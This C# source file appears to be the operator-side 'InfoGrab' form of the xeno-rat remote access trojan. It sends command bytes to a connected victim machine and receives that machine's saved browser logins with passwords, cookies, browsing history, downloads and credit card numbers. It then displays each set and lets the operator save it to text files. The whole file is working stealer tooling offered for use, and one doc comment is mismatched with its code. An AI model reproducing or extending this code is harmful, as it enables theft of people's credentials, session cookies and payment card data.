using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class InfoGrab : Form
    {
        Node client;
        public InfoGrab(Node _client)
        {
            client = _client;
            InitializeComponent();
        }

        /// <summary>
        /// Disables all the buttons in the form.
        /// </summary>
        /// <remarks>
        /// This method iterates through all the controls in the form and disables any buttons found.
        /// </remarks>
        private void DisableAllButtons()
        {
            foreach (Control control in Controls)
            {
                if (control is Button button)
                {
                    button.Enabled = false;
                }
            }
        }

        /// <summary>
        /// Enables all the buttons within the form.
        /// </summary>
        /// <remarks>
        /// This method iterates through all the controls within the form and enables any control of type Button.
        /// </remarks>
        private void EnableAllButtons()
        {
            foreach (Control control in Controls)
            {
                if (control is Button button)
                {
                    button.Enabled = true;
                }
            }
        }

        /// <summary>
        /// Deserializes a byte array into a list of Login objects.
        /// </summary>
        /// <param name="bytes">The byte array to be deserialized.</param>
        /// <returns>A list of Login objects deserialized from the input byte array.</returns>
        /// <remarks>
        /// This method deserializes the input byte array into a list of Login objects. It reads the number of Login objects from the byte array, and then iterates through the array to read the URL, username, and password for each Login object.
        /// The method constructs a new Login object for each set of URL, username, and password, and adds it to the list.
        /// The deserialized list of Login objects is then returned.
        /// </remarks>
        public static List<Login> DeserializeLoginList(byte[] bytes)
        {
            List<Login> loginList = new List<Login>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string url = reader.ReadString();
                    string username = reader.ReadString();
                    string password = reader.ReadString();
                    loginList.Add(new Login(url, username, password));
                }
            }
            return loginList;
        }

        /// <summary>
        /// Deserializes a byte array into a list of cookies.
        /// </summary>
        /// <param name="bytes">The byte array to be deserialized.</param>
        /// <returns>A list of cookies deserialized from the input <paramref name="bytes"/>.</returns>
        /// <remarks>
        /// This method deserializes the input byte array <paramref name="bytes"/> into a list of cookies.
        /// It reads the number of cookies from the byte array, then iterates through each cookie's properties (host, name, path, value, and expiration) and adds them to the cookie list.
        /// The method returns the deserialized list of cookies.
        /// </remarks>
        public static List<Cookie> DeserializeCookieList(byte[] bytes)
        {
            List<Cookie> cookieList = new List<Cookie>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string host = reader.ReadString();
                    string name = reader.ReadString();
                    string path = reader.ReadString();
                    string value = reader.ReadString();
                    long expires = reader.ReadInt64();
                    cookieList.Add(new Cookie(host, name, path, value, expires));
                }
            }
            return cookieList;
        }

        /// <summary>
        /// Deserializes a byte array into a list of WebHistory objects.
        /// </summary>
        /// <param name="bytes">The byte array to be deserialized.</param>
        /// <returns>A list of WebHistory objects deserialized from the input byte array.</returns>
        /// <remarks>
        /// This method deserializes the input byte array into a list of WebHistory objects.
        /// It reads the number of WebHistory objects from the byte array, and then iterates through the array to read the URL, title, and timestamp for each WebHistory object.
        /// It then constructs a new WebHistory object using the read data and adds it to the list.
        /// The method returns the deserialized list of WebHistory objects.
        /// </remarks>
        public static List<WebHistory> DeserializeWebHistoryList(byte[] bytes)
        {
            List<WebHistory> historyList = new List<WebHistory>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string url = reader.ReadString();
                    string title = reader.ReadString();
                    long timestamp = reader.ReadInt64();
                    historyList.Add(new WebHistory(url, title, timestamp));
                }
            }
            return historyList;
        }

        /// <summary>
        /// Deserializes a byte array into a list of Download objects.
        /// </summary>
        /// <param name="bytes">The byte array to be deserialized.</param>
        /// <returns>A list of Download objects deserialized from the input byte array.</returns>
        /// <remarks>
        /// This method deserializes the input byte array into a list of Download objects.
        /// It reads the number of downloads from the byte array, and then iterates through the array to read tab URLs and target paths for each download.
        /// It creates a new Download object for each pair of tab URL and target path, and adds it to the download list.
        /// </remarks>
        public static List<Download> DeserializeDownloadList(byte[] bytes)
        {
            List<Download> downloadList = new List<Download>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string tab_url = reader.ReadString();
                    string target_path = reader.ReadString();
                    downloadList.Add(new Download(tab_url, target_path));
                }
            }
            return downloadList;
        }

        /// <summary>
        /// Deserializes a byte array into a list of CreditCard objects.
        /// </summary>
        /// <param name="bytes">The byte array to be deserialized.</param>
        /// <returns>A list of CreditCard objects deserialized from the input byte array.</returns>
        /// <remarks>
        /// This method deserializes the input byte array into a list of CreditCard objects.
        /// It reads the number of CreditCard objects from the byte array, and then iterates through the array to read the details of each CreditCard object, including name, month, year, number, and date_modified.
        /// The method then constructs a CreditCard object for each set of details and adds it to the list.
        /// </remarks>
        public static List<CreditCard> DeserializeCreditCardList(byte[] bytes)
        {
            List<CreditCard> creditCardList = new List<CreditCard>();
            using (MemoryStream memoryStream = new MemoryStream(bytes))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                int count = reader.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    string name = reader.ReadString();
                    string month = reader.ReadString();
                    string year = reader.ReadString();
                    string number = reader.ReadString();
                    long date_modified = reader.ReadInt64();
                    creditCardList.Add(new CreditCard(name, month, year, number, date_modified));
                }
            }
            return creditCardList;
        }

        /// <summary>
        /// Called when the InfoGrab form is loaded.
        /// </summary>
        private void InfoGrab_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Disables all buttons, sends a byte array to the client, receives a byte array from the client, and processes the data to display in a rich text box.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method disables all buttons, sends a byte array to the client using asynchronous communication, receives a byte array from the client using asynchronous communication, processes the received data to display in a rich text box, and then enables all buttons.
        /// If no data is received from the client, an error message is displayed, and the form is closed.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 0 });
            byte[] data = await client.ReceiveAsync();
            if (data == null) 
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<Login> loginData=DeserializeLoginList(data);
            foreach (Login i in loginData) 
            {
                textdata += i.ToString()+"\n";
            }
            richTextBox1.Text = textdata;
            EnableAllButtons();
        }

        /// <summary>
        /// Handles the button click event by sending a byte to the client and receiving data asynchronously.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method disables all buttons, sends a byte to the client using the <paramref name="client"/> and receives data asynchronously.
        /// If the received data is null, it displays an error message and closes the form.
        /// Then, it deserializes the received data into a list of cookies and populates the <see cref="richTextBox2"/> with the cookie information.
        /// Finally, it enables all buttons.
        /// </remarks>
        private async void button3_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 1 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<Cookie> cookieData = DeserializeCookieList(data);
            foreach (Cookie i in cookieData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox2.Text = textdata;
            EnableAllButtons();
        }

        /// <summary>
        /// Sends a request to the client and displays the received data in richTextBox3.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method sends a request to the client using the SendAsync method and awaits the response using the ReceiveAsync method.
        /// If the received data is null, it displays an error message and closes the form.
        /// It then deserializes the received data into a list of WebHistory objects and populates richTextBox3 with the string representation of each WebHistory object.
        /// Finally, it enables all buttons after completing the operation.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs with the infograbbing.</exception>
        private async void button5_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 4 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<WebHistory> historyData = DeserializeWebHistoryList(data);
            foreach (WebHistory i in historyData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox3.Text = textdata;
            EnableAllButtons();
        }

        /// <summary>
        /// Disables all buttons, sends a byte array to the client, receives a byte array from the client, and processes the data to display in a rich text box.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <exception cref="Exception">Thrown when an error occurs with the infograbbing.</exception>
        /// <returns>An asynchronous task representing the operation.</returns>
        /// <remarks>
        /// This method disables all buttons, sends a byte array with value 3 to the client using the SendAsync method of the client object.
        /// It then receives a byte array from the client using the ReceiveAsync method of the client object.
        /// If the received data is null, it displays an error message and closes the form.
        /// It deserializes the received byte array into a list of Download objects using the DeserializeDownloadList method.
        /// It then iterates through the list of Download objects, concatenates their string representations, and displays the result in a rich text box.
        /// Finally, it enables all buttons after completing the operation.
        /// </remarks>
        private async void button7_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 3 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<Download> downloadData = DeserializeDownloadList(data);
            foreach (Download i in downloadData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox4.Text = textdata;
            EnableAllButtons();
        }

        /// <summary>
        /// Sends a request to the client and displays the received data in a rich text box.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the infograbbing process.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a request to the client using the SendAsync method and waits for the response using the ReceiveAsync method.
        /// If the received data is null, an error message is displayed, and the form is closed.
        /// The received data is deserialized into a list of CreditCard objects, and each object is appended to the textdata string.
        /// The textdata is then displayed in the richTextBox5 control, and all buttons are enabled after the operation is completed.
        /// </remarks>
        private async void button9_Click(object sender, EventArgs e)
        {
            DisableAllButtons();
            await client.SendAsync(new byte[] { 2 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                MessageBox.Show("An error has occered with the infograbbing!");
                this.Close();
            }
            string textdata = "";
            List<CreditCard> downloadData = DeserializeCreditCardList(data);
            foreach (CreditCard i in downloadData)
            {
                textdata += i.ToString() + "\n";
            }
            richTextBox5.Text = textdata;
            EnableAllButtons();
        }

        /// <summary>
        /// Event handler for the TextChanged event of the richTextBox1 control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method is called when the text in the richTextBox1 control is changed.
        /// </remarks>
        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Handles the button click event to save the content of the richTextBox to a text file.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method creates a new thread to handle the file saving operation in order to prevent blocking the main UI thread.
        /// It prompts the user to select a location to save the file and then writes the content of the richTextBox to the selected file.
        /// The file is saved in the .txt format.
        /// </remarks>
        private void button2_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                                using (StreamWriter writer = new StreamWriter(fileStream))
                                {

                                    await writer.WriteAsync(richTextBox1.Text);
                                }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        /// <summary>
        /// Handles the click event of button4 by saving the content of richTextBox2 to a text file.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method creates a new thread to handle the file saving operation in order to prevent the UI from freezing.
        /// It prompts the user to select a location to save the file and then writes the content of richTextBox2 to the selected file.
        /// The file is saved in a text format with a .txt extension.
        /// </remarks>
        /// <exception cref="System.InvalidOperationException">
        /// Thrown when the operation is not valid for the current state of the control, such as when the control is in a state that does not allow writing.
        /// </exception>
        /// <exception cref="System.ObjectDisposedException">
        /// Thrown when the control has already been disposed.
        /// </exception>
        private void button4_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox2.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        /// <summary>
        /// Handles the button click event to save the content of richTextBox3 to a text file.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method creates a new thread to handle the file saving operation in order to prevent blocking the main UI thread.
        /// It initializes a SaveFileDialog to prompt the user for the file path and name.
        /// If the user selects a valid file path and name, the method writes the content of richTextBox3 to the specified text file using asynchronous file I/O operations.
        /// </remarks>
        private void button6_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox3.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        /// <summary>
        /// Handles the button click event to save the content of richTextBox4 to a text file.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method creates a new thread to handle the file saving operation in the background, ensuring that the UI remains responsive.
        /// It prompts the user to select a location to save the file using a SaveFileDialog.
        /// If the user selects a valid location and confirms the save operation, the content of richTextBox4 is asynchronously written to the selected file.
        /// The method sets the thread's apartment state to STA (Single-Threaded Apartment) to ensure proper interaction with the UI components.
        /// </remarks>
        private void button8_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox4.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        /// <summary>
        /// Handles the click event of button10 by saving the content of richTextBox5 to a text file.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method creates a new thread to handle the file saving operation in order to prevent freezing the UI.
        /// It prompts the user to select a location to save the file and then writes the content of richTextBox5 to the selected file.
        /// </remarks>
        private void button10_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() =>
            {

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();

                saveFileDialog1.Filter = "txt files (*.txt)|*.txt";
                saveFileDialog1.DefaultExt = "txt";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string filePath = saveFileDialog1.FileName;
                    richTextBox1.Invoke((Action)(async () =>
                    {
                        using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                        {

                            using (StreamWriter writer = new StreamWriter(fileStream))
                            {

                                await writer.WriteAsync(richTextBox5.Text);
                            }
                        }
                    }));
                }
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }



    public class Login
    {
        public Login(string url, string username, string password)
        {
            this.url = url;
            this.username = username;
            this.password = password;
        }

        public string url { get; set; }
        public string username { get; set; }
        public string password { get; set; }

        /// <summary>
        /// Returns a string representation of the object.
        /// </summary>
        /// <returns>A string containing the name, expiry date, number, and modified date of the object.</returns>
        /// <remarks>
        /// This method retrieves the modified date and time from the Unix timestamp <paramref name="date_modified"/> and converts it to the local date and time.
        /// It then constructs and returns a string containing the name, expiry date, number, and modified date of the object.
        /// </remarks>
        public override string ToString()
        {
            return $"URL: {url}\nUsername: {username}\nPassword: {password}\n";
        }
    }

    public class Cookie
    {
        public Cookie(string host, string name, string path, string value, long expires)
        {
            this.host = host;
            this.name = name;
            this.path = path;
            this.value = value;
            this.expires = expires;
        }

        public string host { get; set; }
        public string name { get; set; }
        public string path { get; set; }
        public string value { get; set; }
        public long expires { get; set; }

        public override string ToString()
        {
            DateTime expirationDateTime = DateTimeOffset.FromUnixTimeSeconds(expires).LocalDateTime;
            return $"Host: {host}\nName: {name}\nPath: {path}\nValue: {value}\nExpires: {expirationDateTime}\n";
        }

    }

    public class WebHistory
    {
        public WebHistory(string url, string title, long timestamp)
        {
            this.url = url;
            this.title = title;
            this.timestamp = timestamp;
        }

        public string url { get; set; }
        public string title { get; set; }
        public long timestamp { get; set; }

        public override string ToString()
        {
            DateTime timestampDateTime = DateTimeOffset.FromUnixTimeSeconds(timestamp).LocalDateTime;
            return $"URL: {url}\nTitle: {title}\nTimestamp: {timestampDateTime}\n";
        }

    }

    public class Download
    {
        public Download(string tab_url, string target_path)
        {
            this.tab_url = tab_url;
            this.target_path = target_path;
        }

        public string tab_url { get; set; }
        public string target_path { get; set; }

        public override string ToString()
        {
            return $"Tab URL: {tab_url}\nTarget Path: {target_path}\n";
        }

    }

    public class CreditCard
    {
        public CreditCard(string name, string month, string year, string number, long date_modified)
        {
            this.name = name;
            this.month = month;
            this.year = year;
            this.number = number;
            this.date_modified = date_modified;
        }

        public string name { get; set; }
        public string month { get; set; }
        public string year { get; set; }
        public string number { get; set; }
        public long date_modified { get; set; }

        public override string ToString()
        {
            DateTime modifiedDateTime = DateTimeOffset.FromUnixTimeSeconds(date_modified).LocalDateTime;
            return $"Name: {name}\nExpiry: {month}/{year}\nNumber: {number}\nModified Date: {modifiedDateTime}\n";
        }

    }
}
